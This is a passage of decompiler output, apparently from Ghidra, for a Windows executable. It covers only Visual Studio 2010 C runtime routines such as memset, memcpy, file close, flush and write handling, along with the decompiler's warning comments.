      goto LAB_0040904b;
    }
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
LAB_0040904b:
  FUN_004071df();
  return -1;
}



void FUN_004090eb(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2010 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    return -1;
  }
  return _File->_file;
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  size_t sVar4;
  uint *puVar5;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  if ((((char)_Val == '\0') && (0x7f < _Size)) && (DAT_00418e88 != 0)) {
    pauVar2 = __VEC_memzero((undefined (*) [16])_Dst,_Size);
    return pauVar2;
  }
  puVar5 = (uint *)_Dst;
  if (3 < _Size) {
    uVar3 = -(int)_Dst & 3;
    sVar4 = _Size;
    if (uVar3 != 0) {
      sVar4 = _Size - uVar3;
      do {
        *(char *)puVar5 = (char)_Val;
        puVar5 = (uint *)((int)puVar5 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar4 & 3;
    uVar3 = sVar4 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar5 = (char)uVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_00418ea0 + 0x84) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_00418ea0 + 0x44) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_00409200;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_00409202;
    }
  }
LAB_00409200:
  DVar4 = 0;
LAB_00409202:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2010 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00418e90)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_004092f2();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004071df();
  }
  return -1;
}



void FUN_004092f2(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2010 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2010 Release

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = __fileno(_File);
        iVar1 = __commit(iVar1);
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _flsall(int param_1)

{
  void **ppvVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_00419fc0; _Index = _Index + 1) {
    ppvVar1 = (void **)(DAT_00418fbc + _Index * 4);
    if ((*ppvVar1 != (void *)0x0) && (_File = *ppvVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0))
    {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_00418fbc + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_0040947d();
    }
  }
  FUN_004094ac();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_0040947d(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_00418fbc + unaff_ESI * 4));
  return;
}



void FUN_004094ac(void)

{
  FUN_0040da13(1);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  char cVar1;
  WCHAR WVar2;
  wchar_t *pwVar3;
  wint_t wVar4;
  ulong *puVar5;
  int *piVar6;
  int iVar7;
  _ptiddata p_Var8;
  BOOL BVar9;
  DWORD nNumberOfBytesToWrite;
  WCHAR *pWVar10;
  int iVar11;
  uint uVar12;
  int unaff_EBX;
  WCHAR *pWVar13;
  uint uVar14;
  int iVar15;
  ushort uVar16;
  uint local_1ae8;
  WCHAR *local_1ae4;
  int *local_1ae0;
  uint local_1adc;
  WCHAR *local_1ad8;
  int local_1ad4;
  WCHAR *local_1ad0;
  uint local_1acc;
  char local_1ac5;
  uint local_1ac4;
  DWORD local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
  WCHAR local_6bc [854];
  undefined local_10;
  char local_f;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_1ad0 = (WCHAR *)_Buf;
  local_1acc = 0;
  local_1ad4 = 0;
  if (_MaxCharCount == 0) goto LAB_00409bad;
  if (_Buf == (void *)0x0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_004071df();
    goto LAB_00409bad;
  }
  piVar6 = &DAT_00418ea0 + (_FileHandle >> 5);
  iVar11 = (_FileHandle & 0x1fU) * 0x40;
  local_1ac5 = (char)(*(char *)(*piVar6 + 0x24 + iVar11) * '\x02') >> 1;
  local_1ae0 = piVar6;
  if (((local_1ac5 == '\x02') || (local_1ac5 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_004071df();
    goto LAB_00409bad;
  }
  if ((*(byte *)(*piVar6 + 4 + iVar11) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0x200000000,unaff_EBX);
  }
  iVar7 = __isatty(_FileHandle);
  if ((iVar7 == 0) || ((*(byte *)(iVar11 + 4 + *piVar6) & 0x80) == 0)) {
LAB_0040983e:
    if ((*(byte *)(*piVar6 + 4 + iVar11) & 0x80) == 0) {
      BVar9 = WriteFile(*(HANDLE *)(*piVar6 + iVar11),local_1ad0,_MaxCharCount,&local_1adc,
                        (LPOVERLAPPED)0x0);
      if (BVar9 == 0) {
LAB_00409b1f:
        local_1ac0 = GetLastError();
      }
      else {
        local_1ac0 = 0;
        local_1acc = local_1adc;
      }
LAB_00409b2b:
      if (local_1acc != 0) goto LAB_00409bad;
      goto LAB_00409b34;
    }
    local_1ac0 = 0;
    if (local_1ac5 == '\0') {
      pWVar13 = local_1ad0;
      if (_MaxCharCount == 0) goto LAB_00409b6a;
      do {
        uVar14 = 0;
        uVar12 = (int)pWVar13 - (int)local_1ad0;
        pWVar10 = local_1abc;
        do {
          if (_MaxCharCount <= uVar12) break;
          cVar1 = *(char *)pWVar13;
          pWVar13 = (WCHAR *)((int)pWVar13 + 1);
          uVar12 = uVar12 + 1;
          if (cVar1 == '\n') {
            local_1ad4 = local_1ad4 + 1;
            *(char *)pWVar10 = '\r';
            pWVar10 = (WCHAR *)((int)pWVar10 + 1);
            uVar14 = uVar14 + 1;
          }
          *(char *)pWVar10 = cVar1;
          pWVar10 = (WCHAR *)((int)pWVar10 + 1);
          uVar14 = uVar14 + 1;
          local_1ae4 = pWVar13;
        } while (uVar14 < 0x13ff);
        BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1abc,
                          (int)pWVar10 - (int)local_1abc,&local_1adc,(LPOVERLAPPED)0x0);
        if (BVar9 == 0) goto LAB_00409b1f;
        local_1acc = local_1acc + local_1adc;
      } while (((int)pWVar10 - (int)local_1abc <= (int)local_1adc) &&
              ((uint)((int)pWVar13 - (int)local_1ad0) < _MaxCharCount));
      goto LAB_00409b2b;
    }
    if (local_1ac5 == '\x02') {
      pWVar13 = local_1ad0;
      if (_MaxCharCount != 0) {
        do {
          local_1ac4 = 0;
          uVar12 = (int)pWVar13 - (int)local_1ad0;
          pWVar10 = local_1abc;
          do {
            if (_MaxCharCount <= uVar12) break;
            WVar2 = *pWVar13;
            pWVar13 = pWVar13 + 1;
            uVar12 = uVar12 + 2;
            if (WVar2 == L'\n') {
              local_1ad4 = local_1ad4 + 2;
              *pWVar10 = L'\r';
              pWVar10 = pWVar10 + 1;
              local_1ac4 = local_1ac4 + 2;
            }
            local_1ac4 = local_1ac4 + 2;
            *pWVar10 = WVar2;
            pWVar10 = pWVar10 + 1;
            local_1ae4 = pWVar13;
          } while (local_1ac4 < 0x13fe);
          BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1abc,
                            (int)pWVar10 - (int)local_1abc,&local_1adc,(LPOVERLAPPED)0x0);
          if (BVar9 == 0) goto LAB_00409b1f;
          local_1acc = local_1acc + local_1adc;
        } while (((int)pWVar10 - (int)local_1abc <= (int)local_1adc) &&
                ((uint)((int)pWVar13 - (int)local_1ad0) < _MaxCharCount));
        goto LAB_00409b2b;
      }
    }
    else {
      local_1ad8 = local_1ad0;
      if (_MaxCharCount != 0) {
        do {
          local_1ac4 = 0;
          uVar12 = (int)local_1ad8 - (int)local_1ad0;
          pWVar13 = local_6bc;
          do {
            if (_MaxCharCount <= uVar12) break;
            WVar2 = *local_1ad8;
            local_1ad8 = local_1ad8 + 1;
            uVar12 = uVar12 + 2;
            if (WVar2 == L'\n') {
              *pWVar13 = L'\r';
              pWVar13 = pWVar13 + 1;
              local_1ac4 = local_1ac4 + 2;
            }
            local_1ac4 = local_1ac4 + 2;
            *pWVar13 = WVar2;
            pWVar13 = pWVar13 + 1;
          } while (local_1ac4 < 0x6a8);
          iVar15 = 0;
          iVar7 = WideCharToMultiByte(0xfde9,0,local_6bc,((int)pWVar13 - (int)local_6bc) / 2,
                                      local_1414,0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
          if (iVar7 == 0) goto LAB_00409b1f;
          do {
            BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),local_1414 + iVar15,iVar7 - iVar15,
                              &local_1adc,(LPOVERLAPPED)0x0);
            if (BVar9 == 0) {
              local_1ac0 = GetLastError();
              break;
            }
            iVar15 = iVar15 + local_1adc;
          } while (iVar15 < iVar7);
        } while ((iVar7 <= iVar15) &&
                (local_1acc = (int)local_1ad8 - (int)local_1ad0, local_1acc < _MaxCharCount));
        goto LAB_00409b2b;
      }
    }
  }
  else {
    p_Var8 = __getptd();
    pwVar3 = p_Var8->ptlocinfo->lc_category[0].wlocale;
    BVar9 = GetConsoleMode(*(HANDLE *)(iVar11 + *piVar6),(LPDWORD)&local_1ae4);
    if ((BVar9 == 0) || ((pwVar3 == (wchar_t *)0x0 && (local_1ac5 == '\0')))) goto LAB_0040983e;
    local_1ae4 = (WCHAR *)GetConsoleCP();
    local_1ad8 = (WCHAR *)0x0;
    if (_MaxCharCount != 0) {
      local_1ac4 = 0;
      pWVar13 = local_1ad0;
      do {
        piVar6 = local_1ae0;
        if (local_1ac5 == '\0') {
          cVar1 = *(char *)pWVar13;
          local_1ae8 = (uint)(cVar1 == '\n');
          iVar7 = *local_1ae0 + iVar11;
          if (*(int *)(iVar7 + 0x38) == 0) {
            iVar7 = _isleadbyte(CONCAT22(cVar1 >> 7,(short)cVar1));
            if (iVar7 == 0) {
              uVar16 = 1;
              pWVar10 = pWVar13;
              goto LAB_004096a5;
            }
            if ((char *)((int)local_1ad0 + (_MaxCharCount - (int)pWVar13)) < (char *)0x2) {
              local_1acc = local_1acc + 1;
              *(undefined *)(iVar11 + 0x34 + *piVar6) = *(undefined *)pWVar13;
              *(undefined4 *)(iVar11 + 0x38 + *piVar6) = 1;
              break;
            }
            iVar7 = _mbtowc((wchar_t *)&local_1ac0,(char *)pWVar13,2);
            if (iVar7 == -1) break;
            pWVar13 = (WCHAR *)((int)pWVar13 + 1);
            local_1ac4 = local_1ac4 + 1;
          }
          else {
            local_10 = *(undefined *)(iVar7 + 0x34);
            *(undefined4 *)(iVar7 + 0x38) = 0;
            uVar16 = 2;
            pWVar10 = (WCHAR *)&local_10;
            local_f = cVar1;
LAB_004096a5:
            iVar7 = _mbtowc((wchar_t *)&local_1ac0,(char *)pWVar10,(uint)uVar16);
            if (iVar7 == -1) break;
          }
          pWVar13 = (WCHAR *)((int)pWVar13 + 1);
          local_1ac4 = local_1ac4 + 1;
          nNumberOfBytesToWrite =
               WideCharToMultiByte((UINT)local_1ae4,0,(LPCWSTR)&local_1ac0,1,&local_10,5,(LPCSTR)0x0
                                   ,(LPBOOL)0x0);
          if (nNumberOfBytesToWrite == 0) break;
          BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),&local_10,nNumberOfBytesToWrite,
                            (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar9 == 0) goto LAB_00409b1f;
          local_1acc = local_1ac4 + local_1ad4;
          if ((int)local_1ad8 < (int)nNumberOfBytesToWrite) break;
          if (local_1ae8 != 0) {
            local_10 = 0xd;
            BVar9 = WriteFile(*(HANDLE *)(iVar11 + *local_1ae0),&local_10,1,(LPDWORD)&local_1ad8,
                              (LPOVERLAPPED)0x0);
            if (BVar9 == 0) goto LAB_00409b1f;
            if ((int)local_1ad8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = local_1acc + 1;
          }
        }
        else {
          if ((local_1ac5 == '\x01') || (local_1ac5 == '\x02')) {
            local_1ac0 = (DWORD)(ushort)*pWVar13;
            local_1ae8 = (uint)(local_1ac0 == 10);
            pWVar13 = pWVar13 + 1;
            local_1ac4 = local_1ac4 + 2;
          }
          if ((local_1ac5 == '\x01') || (local_1ac5 == '\x02')) {
            wVar4 = __putwch_nolock((wchar_t)local_1ac0);
            if (wVar4 != (wint_t)local_1ac0) goto LAB_00409b1f;
            local_1acc = local_1acc + 2;
            if (local_1ae8 != 0) {
              local_1ac0 = 0xd;
              wVar4 = __putwch_nolock(L'\r');
              if (wVar4 != (wint_t)local_1ac0) goto LAB_00409b1f;
              local_1acc = local_1acc + 1;
              local_1ad4 = local_1ad4 + 1;
            }
          }
        }
      } while (local_1ac4 < _MaxCharCount);
      goto LAB_00409b2b;
    }
LAB_00409b34:
    if (local_1ac0 != 0) {
      if (local_1ac0 == 5) {
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        __dosmaperr(local_1ac0);
      }
      goto LAB_00409bad;
    }
  }
LAB_00409b6a:
  if (((*(byte *)(iVar11 + 4 + *local_1ae0) & 0x40) == 0) || (*(char *)local_1ad0 != '\x1a')) {
    piVar6 = __errno();
    *piVar6 = 0x1c;
    puVar5 = ___doserrno();
    *puVar5 = 0;
  }
LAB_00409bad:
  iVar11 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar11;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2010 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00418e90)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_00409c87();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004071df();
  }
  return -1;
}



void FUN_00409c87(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  _memcpy
//  _memmove
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_00409e6f_caseD_2;
        case 3:
          goto switchD_00409e6f_caseD_3;
        }
        goto switchD_00409e6f_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_00409e6f_caseD_0;
      case 1:
        goto switchD_00409e6f_caseD_1;
      case 2:
        goto switchD_00409e6f_caseD_2;
      case 3:
        goto switchD_00409e6f_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00409e6f_caseD_2;
            case 3:
              goto switchD_00409e6f_caseD_3;
            }
            goto switchD_00409e6f_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00409e6f_caseD_2;
            case 3:
              goto switchD_00409e6f_caseD_3;
            }
            goto switchD_00409e6f_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00409e6f_caseD_2;
            case 3:
              goto switchD_00409e6f_caseD_3;
            }
            goto switchD_00409e6f_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_00409e6f_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_00409e6f_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_00409e6f_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_00409e6f_caseD_0:
    return _Dst;
  }
  if (((0x7f < _Size) && (DAT_00418e88 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy(_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_00409ce9_caseD_2;
      case 3:
        goto switchD_00409ce9_caseD_3;
      }
      goto switchD_00409ce9_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_00409ce9_caseD_0;
    case 1:
      goto switchD_00409ce9_caseD_1;
    case 2:
      goto switchD_00409ce9_caseD_2;
    case 3:
      goto switchD_00409ce9_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00409ce9_caseD_2;
          case 3:
            goto switchD_00409ce9_caseD_3;
          }
          goto switchD_00409ce9_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00409ce9_caseD_2;
          case 3:
            goto switchD_00409ce9_caseD_3;
          }
          goto switchD_00409ce9_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00409ce9_caseD_2;
          case 3:
            goto switchD_00409ce9_caseD_3;
          }
          goto switchD_00409ce9_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
